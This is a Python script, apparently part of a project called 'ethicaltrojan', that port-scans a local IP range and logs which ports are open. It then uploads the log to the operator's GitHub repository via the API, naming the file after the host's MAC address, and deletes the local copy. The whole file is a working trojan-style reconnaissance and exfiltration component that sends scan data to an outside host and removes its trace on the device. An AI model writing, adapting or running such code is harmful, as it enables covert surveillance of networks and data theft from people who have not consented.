import subprocess
import sys
import socket
import time
import json
import os
import psutil
import requests
import base64

# Function to install required packages
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Install missing dependencies
required_packages = ['psutil', 'requests']
for package in required_packages:
    try:
        __import__(package)  # Try to import the package to check if it's installed
    except ImportError:
        print(f"{package} not found. Installing...")
        install(package)

# Now, import after installation
import psutil
import requests

# Load GitHub token from the config.json file
def load_github_token():
    config_file = "config.json"
    if os.path.exists(config_file):
        with open(config_file, 'r') as file:
            config = json.load(file)
            return config.get("GITHUB_TOKEN", "")
    else:
        print("Config file not found!")
        return ""

GITHUB_TOKEN = load_github_token()  # Load GitHub token
REPO_OWNER = "jonas638"  # Change to your GitHub username
REPO_NAME = "ethicaltrojan"  # Change to your repository name
FOLDER_PATH = "portscan"
SCAN_LOG_FILE = 'portscan_log.txt'  # File to log port scan results

# Get the MAC address of the device
def get_mac_address():
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == psutil.AF_LINK:
                mac_address = addr.address
                if mac_address and mac_address != "00:00:00:00:00:00":
                    return mac_address.replace(":", "-").lower()
    return "00-00-00-00-00-00"

# Simple function to check if a specific port is open on a target IP
def check_port(target_ip, port):
    try:
        # Create a socket and try connecting to the target IP and port
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)  # Timeout after 1 second
            result = sock.connect_ex((target_ip, port))  # Try connecting to the port
            if result == 0:
                print(f"Port {port} is OPEN on {target_ip}")  # Debug: show open ports
                return True  # Port is open
            else:
                return False  # Port is closed
    except socket.error as e:
        print(f"Error on {target_ip} port {port}: {e}")  # Debug: print errors
        return False  # Error (e.g., target unreachable)

# Function to scan a range of IP addresses
def scan_ip_range(start_ip, end_ip, port_range=(1, 10)):
    open_ports_for_all_ips = {}
    start_parts = start_ip.split('.')
    end_parts = end_ip.split('.')
    
    # Convert start and end IPs to integer values to loop through them
    start_int = int(start_parts[3])
    end_int = int(end_parts[3])

    # Loop through the range of IPs
    for i in range(start_int, end_int + 1):
        target_ip = '.'.join(start_parts[:3]) + f'.{i}'
        open_ports = []
        # Ensure only ports within the defined range are scanned
        for port in range(port_range[0], port_range[1] + 1):
            print(f"Scanning port {port} on {target_ip}...")  # Debug: display the port being scanned
            if check_port(target_ip, port):
                open_ports.append(port)
        open_ports_for_all_ips[target_ip] = open_ports

    return open_ports_for_all_ips

# Log the port scan results
def log_port_scan_results(open_ports_for_all_ips):
    with open(SCAN_LOG_FILE, 'a') as log_file:
        for target_ip, open_ports in open_ports_for_all_ips.items():
            log_file.write(f"Scan Results for {target_ip}:\n")
            if open_ports:
                log_file.write(f"Open ports: {', '.join(map(str, open_ports))}\n")
            else:
                log_file.write("No open ports found.\n")
            log_file.write("\n")

# Upload the port scan results to GitHub and delete the log file after upload
def upload_portscan_to_github(file_path, mac_address):
    # Read the port scan log
    with open(file_path, 'r') as file:
        content = file.read()

    # Convert content to Base64
    encoded_content = base64.b64encode(content.encode()).decode()

    # GitHub API URL to upload the file
    upload_path = f"{FOLDER_PATH}/{mac_address}-portscan-log.txt"
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{upload_path}"

    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json",
    }

    # Check if the file already exists
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        sha = response.json()["sha"]
        message = "Updating portscan log"
    else:
        sha = None
        message = "Creating portscan log"

    payload = {
        "message": message,
        "content": encoded_content,
    }
    if sha:
        payload["sha"] = sha

    response = requests.put(url, headers=headers, data=json.dumps(payload))

    if response.status_code in [200, 201]:
        print(f"File '{upload_path}' uploaded successfully!")
        # Delete the log file from the local device after successful upload
        try:
            os.remove(file_path)
            print(f"{file_path} has been deleted from the local device.")
        except Exception as e:
            print(f"Error deleting the file: {e}")
    else:
        print(f"Failed to upload file: {response.status_code}")
        print(response.json())

def main():
    # Get the MAC address of the machine
    mac_address = get_mac_address()
    
    # Define the range of IPs to scan
    start_ip = "192.168.0.101"  # Replace with the starting IP address
    end_ip = "192.168.0.102"  # Replace with the ending IP address

    # Scan the IP range for open ports
    print(f"Scanning IP range {start_ip} to {end_ip}...")
    open_ports_for_all_ips = scan_ip_range(start_ip, end_ip, port_range=(1, 10))  # Scan only ports 1-10
    
    # Log the results
    log_port_scan_results(open_ports_for_all_ips)
    
    # Upload the log file to GitHub and delete it afterward
    upload_portscan_to_github(SCAN_LOG_FILE, mac_address)

if __name__ == "__main__":
    main()
